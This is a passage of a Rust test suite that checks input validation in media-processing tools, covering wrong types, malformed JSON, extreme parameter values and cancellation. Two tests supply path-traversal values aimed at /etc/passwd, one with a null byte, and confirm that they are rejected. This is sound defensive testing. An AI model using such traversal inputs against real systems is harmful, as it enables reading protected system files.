    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_convert_format_path_traversal() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::convert::ConvertOp;
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "format": "../../etc/passwd"
                }),
                &ctx,
            )
            .await;
        assert!(result.is_err(), "path traversal in format must be rejected");
        // ConvertOp should return NIKA-291 (unsupported format) for unknown format strings
        assert!(
            result.unwrap_err().to_string().contains("NIKA-291"),
            "expected NIKA-291 for path traversal format"
        );
    }

    /// Format parameter with null byte.
    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_convert_format_null_byte() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::convert::ConvertOp;
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "format": "png\0../../etc/passwd"
                }),
                &ctx,
            )
            .await;
        // The match in ConvertOp checks for exact "png", "jpeg", "webp"
        // so "png\0..." falls through to the unsupported_format branch
        assert!(
            result.is_err(),
            "format with null byte must not match 'png'"
        );
        assert!(
            result.unwrap_err().to_string().contains("NIKA-291"),
            "expected NIKA-291 for format with null byte"
        );
    }

    /// Missing required params should always give NIKA-294.
    #[tokio::test]
    async fn inject_all_tools_missing_hash_param() {
        let (_dir, ctx) = setup().await;

        // DimensionsOp
        let result = DimensionsOp.execute(serde_json::json!({}), &ctx).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("NIKA-294"));

        // ThumbhashOp
        let result = ThumbhashOp.execute(serde_json::json!({}), &ctx).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("NIKA-294"));

        // DominantColorOp
        let result = crate::runtime::builtin::media::color::DominantColorOp
            .execute(serde_json::json!({}), &ctx)
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("NIKA-294"));
    }

    /// Feature-gated tools: missing required params.
    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_thumbnail_missing_all_params() {
        let (_dir, ctx) = setup().await;

        let op = crate::runtime::builtin::media::thumbnail::ThumbnailOp;
        let result = op.execute(serde_json::json!({}), &ctx).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("NIKA-294"));
    }

    /// Null JSON value for hash parameter.
    #[tokio::test]
    async fn inject_null_hash_value() {
        let (_dir, ctx) = setup().await;
        let op = DimensionsOp;
        let result = op.execute(serde_json::json!({"hash": null}), &ctx).await;
        assert!(result.is_err(), "null hash value must be rejected");
        assert!(result.unwrap_err().to_string().contains("NIKA-294"));
    }

    /// Integer value for hash parameter (type confusion).
    #[tokio::test]
    async fn inject_integer_hash_value() {
        let (_dir, ctx) = setup().await;
        let op = DimensionsOp;
        let result = op.execute(serde_json::json!({"hash": 12345}), &ctx).await;
        assert!(result.is_err(), "integer hash value must be rejected");
        assert!(result.unwrap_err().to_string().contains("NIKA-294"));
    }

    /// Array value for hash parameter.
    #[tokio::test]
    async fn inject_array_hash_value() {
        let (_dir, ctx) = setup().await;
        let op = DimensionsOp;
        let result = op
            .execute(serde_json::json!({"hash": [1, 2, 3]}), &ctx)
            .await;
        assert!(result.is_err(), "array hash value must be rejected");
        assert!(result.unwrap_err().to_string().contains("NIKA-294"));
    }

    /// Boolean value for hash parameter.
    #[tokio::test]
    async fn inject_boolean_hash_value() {
        let (_dir, ctx) = setup().await;
        let op = DimensionsOp;
        let result = op.execute(serde_json::json!({"hash": true}), &ctx).await;
        assert!(result.is_err(), "boolean hash value must be rejected");
        assert!(result.unwrap_err().to_string().contains("NIKA-294"));
    }

    /// Invalid JSON through the MediaToolAdapter (the BuiltinTool entry point).
    #[tokio::test]
    async fn inject_adapter_malformed_json() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = Arc::new(MediaToolContext::new(CasStore::new(dir.path())).unwrap());
        let adapter = MediaToolAdapter::new(Arc::new(DimensionsOp), engine_ctx(ctx));

        let malformed_inputs = vec![
            "",
            "not json at all",
            "{",
            "{'single': 'quotes'}",
            "[1, 2, 3]", // Array, not object
            "null",
            "42",
            "true",
        ];

        for input in malformed_inputs {
            let result = adapter.call(input.to_string()).await;
            assert!(
                result.is_err(),
                "malformed JSON '{}' must be rejected",
                input
            );
            let err = result.unwrap_err();
            assert!(
                err.to_string().contains("NIKA-294"),
                "expected NIKA-294 for malformed JSON '{}', got: {err}",
                input
            );
        }
    }

    /// Optimize with negative level should be clamped, not crash.
    #[cfg(feature = "media-optimize")]
    #[tokio::test]
    async fn inject_optimize_negative_level() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::optimize::OptimizeOp;
        // -1 as JSON: as_u64() returns None, so default (2) is used
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "level": -1
                }),
                &ctx,
            )
            .await;
        // Should succeed with default level, not crash
        assert!(
            result.is_ok(),
            "negative level should fall back to default, not crash"
        );
    }

    /// SVG render with negative width should be handled gracefully.
    #[cfg(feature = "media-svg")]
    #[tokio::test]
    async fn inject_svg_render_negative_dimensions() {
        let (_dir, ctx) = setup().await;
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
      <rect width="100" height="100" fill="red"/>
    </svg>"#;
        let sr = ctx.cas.store(svg.as_bytes()).await.unwrap();

        let op = crate::runtime::builtin::media::svg::SvgRenderOp;
        // Negative: as_u64() returns None, so width/height fallback to SVG natural size
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "width": -100, "height": -100
                }),
                &ctx,
            )
            .await;
        // Should succeed using SVG's natural dimensions
        assert!(
            result.is_ok(),
            "negative dimensions should be ignored (as_u64 returns None)"
        );
    }

    /// Thumbnail with height = 0 should be rejected.
    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_thumbnail_zero_height() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::thumbnail::ThumbnailOp;
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "width": 50, "height": 0
                }),
                &ctx,
            )
            .await;
        assert!(result.is_err(), "zero height must be rejected");
        assert!(
            result.unwrap_err().to_string().contains("NIKA-294"),
            "expected NIKA-294 for zero height"
        );
    }

    /// Thumbnail with height over limit.
    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_thumbnail_height_over_limit() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::thumbnail::ThumbnailOp;
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "width": 50, "height": 20000
                }),
                &ctx,
            )
            .await;
        assert!(result.is_err(), "height > 10000 must be rejected");
        assert!(
            result.unwrap_err().to_string().contains("NIKA-294"),
            "expected NIKA-294 for oversized height"
        );
    }

    /// Quality parameter clamping for convert tool.
    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_convert_extreme_quality_values() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::convert::ConvertOp;

        // Quality = 0 should be clamped to 1
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "format": "jpeg", "quality": 0
                }),
                &ctx,
            )
            .await;
        assert!(
            result.is_ok(),
            "quality=0 should be clamped to 1, not error"
        );

        // Quality = 999 should be clamped to 100
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "format": "jpeg", "quality": 999
                }),
                &ctx,
            )
            .await;
        assert!(
            result.is_ok(),
            "quality=999 should be clamped to 100, not error"
        );
    }

    /// DominantColor count parameter edge cases.
    #[cfg(feature = "media-thumbnail")]
    #[tokio::test]
    async fn inject_dominant_color_extreme_count() {
        let (_dir, ctx) = setup().await;
        let png = fixture_png_10x10();
        let sr = ctx.cas.store(&png).await.unwrap();

        let op = crate::runtime::builtin::media::color::DominantColorOp;

        // count = 0 should be clamped to 2 (minimum for color_thief)
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "count": 0
                }),
                &ctx,
            )
            .await;
        assert!(result.is_ok(), "count=0 should be clamped to 2, not panic");

        // count = 1000 should be clamped to 20
        let result = op
            .execute(
                serde_json::json!({
                  "hash": sr.hash, "count": 1000
                }),
                &ctx,
            )
            .await;
        assert!(
            result.is_ok(),
            "count=1000 should be clamped to 20, not panic"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // BONUS: CANCELLATION UNDER LOAD
    // ═══════════════════════════════════════════════════════════════════════

    /// Cancel a workflow while tools are running -- all must stop cleanly.
    #[tokio::test]
    async fn cancellation_during_concurrent_operations() {
        let (_dir, ctx) = setup().await;

        // Store some data
        let data = b"cancel test data padding to make it non-empty";
        let sr = ctx.cas.store(data).await.unwrap();

        // Launch 20 concurrent operations
        let handles: Vec<_> = (0..20)
            .map(|_| {
                let ctx = Arc::clone(&ctx);
                let hash = sr.hash.clone();
                tokio::spawn(async move {
                    let op = DimensionsOp;
                    op.execute(serde_json::json!({"hash": hash}), &ctx).await
                })
            })
            .collect();

        // Cancel immediately
        ctx.cancel.cancel();

        let results: Vec<_> = futures::future::join_all(handles).await;
        // All should either have completed before cancel or returned error
        // None should panic
        for (i, r) in results.iter().enumerate() {
            match r.as_ref().unwrap() {
                Ok(_) => {} // completed before cancel -- fine
                Err(e) => {
                    // Must be a clean cancellation error, not a panic
                    let msg = e.to_string();
                    assert!(
                        !msg.contains("panicked"),
                        "task {i} panicked during cancellation: {msg}"
                    );
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // BONUS: STORE EMPTY DATA VIA CONTEXT
    // ═══════════════════════════════════════════════════════════════════════

    /// Storing empty data via MediaToolContext should fail with NIKA-258.
    #[tokio::test]
    async fn store_empty_data_via_context_rejected() {
        let (_dir, ctx) = setup().await;
        let result = ctx.store_media(b"", "evil_task").await;
        assert!(result.is_err(), "empty data must be rejected");
        assert!(
            result.unwrap_err().to_string().contains("NIKA-258"),
            "expected NIKA-258 for empty media content"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // HELPERS
    // ═══════════════════════════════════════════════════════════════════════

    #[cfg(any(feature = "media-thumbnail", feature = "media-svg"))]
    fn png_crc(chunk_type: &[u8], data: &[u8]) -> u32 {
        let table = crc32_table();
        let mut crc: u32 = 0xFFFF_FFFF;
        for &b in chunk_type.iter().chain(data.iter()) {
            crc = table[((crc ^ b as u32) & 0xFF) as usize] ^ (crc >> 8);
        }
        crc ^ 0xFFFF_FFFF
    }

    #[cfg(any(feature = "media-thumbnail", feature = "media-svg"))]
    fn crc32_table() -> [u32; 256] {
        let mut t = [0u32; 256];
        for n in 0..256u32 {
            let mut c = n;
            for _ in 0..8 {
                c = if c & 1 != 0 {
                    0xEDB88320 ^ (c >> 1)
                } else {
                    c >> 1
                };
            }
            t[n as usize] = c;
        }
        t
    }

    /// Create a minimal valid 10x10 PNG for parameter injection tests.
    #[cfg(feature = "media-thumbnail")]
    fn fixture_png_10x10() -> Vec<u8> {
        use image::{ImageBuffer, Rgba};
        let img = ImageBuffer::from_pixel(10, 10, Rgba([200u8, 100, 50, 255]));
        let mut buf = Vec::new();
        let enc = image::codecs::png::PngEncoder::new(&mut buf);
        image::ImageEncoder::write_image(
            enc,
            img.as_raw(),
            10,
            10,
            image::ExtendedColorType::Rgba8,
        )
        .unwrap();
        buf
    }
}
